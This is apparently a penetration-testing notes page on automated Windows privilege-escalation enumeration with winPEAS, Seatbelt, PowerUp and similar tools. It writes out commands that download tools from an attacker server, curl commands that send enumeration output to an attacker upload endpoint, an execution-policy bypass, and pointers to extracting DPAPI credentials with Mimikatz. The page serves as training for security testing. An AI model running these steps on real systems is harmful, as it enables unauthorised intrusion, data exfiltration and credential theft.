---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Automated Enumeration

The following will be an example of using automated tools to enumerate a Windows system (`CLIENTWK220`). For the purposes of the example, assume the attacker was previously able to install a bind shell on port `4444` of the machine. The shell is running as unprivileged user `dave`.

Assume the attacker has set up an HTTP server on their machine with a site hosting tools and allowing uploads. I have created one [here](https://github.com/alex-christine/MalSite). This allows the easy transfer of files. For the purposes of these exercises I have written a custom site that can handle uploads at `/cgi-bin/m-upload.php`.

## winPEAS

From the same developers as [LinPEAS](../../../linux/privilege-escalation/enumeration/automated-enumeration.md#linpeas), [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) is an automated tool for enumerating Windows machines.

Precompiled versions of the script can be found on their [latest releases](https://github.com/carlospolop/PEASS-ng/releases/latest) page, or it can be compiled from scratch. For this example the obfuscated `.exe` for any architecture will be used.

Assuming it has been downloaded to the attackers machine it can then be hosted via HTTP:

```sh
python3 -m http.server 80
```

From here the attacker can use the [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3) Cmdlet (alias `iwr`) to download winPEAS:

```powershell
PS C:\Users\dave> iwr -uri http://192.168.45.205/winPEASany_ofs.exe -Outfile wp.exe

PS C:\Users\dave> .\wp.exe > .\wp_check.txt
```

From here the output can ideally be exfiltrated to the attacking machine for viewing. This can be done by uploading to the aforementioned attacker site via `/cgi-bin/m-upload.php`. This can be done via a `curl` command (attacker's machine is at `192.168.45.177`):

```
curl -F "uploadedfile=@wp_check.txt" http://192.168.45.177:8888/cgi-bin/m-upload.php
```

The output can then be examined for interesting items. Of note here are exposed DPAPI credentials/keys.&#x20;

The Data Protection API (DPAPI) can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy. Several DPAPI items are noted in the output:

```
╔══════════╣ Checking for DPAPI Master Keys
╚ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
MasterKey: C:\Users\dave\AppData\Roaming\Microsoft\Protect\S-1-5-21-2309961351-4093026482-2223492918-1002\1a65c284-d429-4e6b-b7ab-5fc1a2d95636
Accessed:  12/7/2022 1:56:40 PM
Modified:  11/8/2022 7:36:17 AM
=================================================================================================

MasterKey: C:\Users\dave\AppData\Roaming\Microsoft\Protect\S-1-5-21-2309961351-4093026482-2223492918-1002\78b3fad1-cf1d-4a36-b5ff-a7e0c32791cd
Accessed:  12/12/2023 4:18:54 PM
Modified:  12/12/2023 3:29:11 PM
=================================================================================================

...

╔══════════╣ Checking for DPAPI Credential Files
╚ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
CredFile:    C:\Users\dave\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
Description: Local Credential Data


MasterKey: 7ba528f7-4e73-48a3-8a67-e5680688c9ff
Accessed:  12/12/2023 4:19:19 PM
Modified:  2/13/2023 2:46:41 AM
Size:      11136
=================================================================================================
```

For one of the DPAPI credential files the MasterKey is just there in the output, `7ba528...`. For the DPAPI master keys, the [linked post](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi) in the output, or [this site](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) provide informtion about how to leverage Mimikatz to extract the keys.

## Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt) is a a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.

It can be used in a similar manner as winPEAS. Compiled binaries can be found on [Github](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), or the code can be compiled by the attacker. In this example, the attacker can again use their web server to deliver a precompiled binary via the existing shell:

```powershell
PS C:\Users\dave> iwr -uri http://192.168.45.177:8888/Windows/Exe/Enumeration/Seatbelt.exe -OutFile seatbelt.exe

PS C:\Users\dave> .\seatbelt.exe -group=all > sb_check.txt
```

The output can then be uploaded via the same `curl` command:

```
curl -F "uploadedfile=@sb_check.txt" http://192.168.45.177:8888/cgi-bin/m-upload.php
```

The output contains many useful sections. In this case it can be examined for installed applications:

```
...
===== InstalledProducts ======

  DisplayName                    : KeePass Password Safe 2.51.1
  DisplayVersion                 : 2.51.1
  Publisher                      : Dominik Reichl
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  ...

  DisplayName                    : 7-Zip 21.07 (x64)
  DisplayVersion                 : 21.07
  Publisher                      : Igor Pavlov
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : XAMPP
  DisplayVersion                 : 7.4.29-1
  Publisher                      : Bitnami
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 11.3.0.18090558
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64
  
  ...
```

## Other Tools

### PowerShell Scripts

Several PowerShell scripts exist to help enumerate machines where scripting is allowed. Among them are:

* [JAWS](https://github.com/411Hall/JAWS)
* [Get-HostProfile](https://app.gitbook.com/s/umJPYuJbJJnqZufaEWJK/attack-vectors/web-shells/reverse-shell)
* [HostEnum](https://github.com/threatexpress/red-team-scripts)
  * There is also a Python version of this tool for environments where that can be used

These scripts can be used in similar ways as the tools above. First the script must be moved to the target machine, then run, and the output analyzed.

### PowerUp

[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is part of a module created to automatically check for privilege escalation vectors. Details on installing the module can be found in the project's [README](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md). It is also possible to import just the PowerUp module and use its commands.

First use the attaacker's HTTP server (hosted at `http://ATTACKER-IP:8888`) to transfer the `PowerUp.ps1` file to the victim machine via an `Invoke-WebRequest` from the victim machine:

{% code overflow="wrap" %}
```powershell
PS C:\Users\dave> Invoke-WebRequest -uri http://192.168.45.177:8888/Windows/PowerShell/PrivilegeEscalation/PowerUp.ps1 -OutFile PowerUp.ps1
```
{% endcode %}

Once on the machine, the module can be imported:

```powershell
PS C:\Users\dave> . .\PowerUp.ps1
. : File C:\Users\dave\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:3
+ . .\PowerUp.ps1
+   ~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```

Unfortunately in this example the&#x20;

[Execution Policy](../../powershell/#powershell-execution-policy) is preventing script execution. PowerShell must be started with the `-ExecutionPolicy Bypass` flag set in order to circumvent the policy:

```powershell
PS C:\Users\dave> PowerShell -ExecutionPolicy Bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave>
```

At this point the module has been imported successfully and any of the [commands](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md#powerup) contained therein can be used.
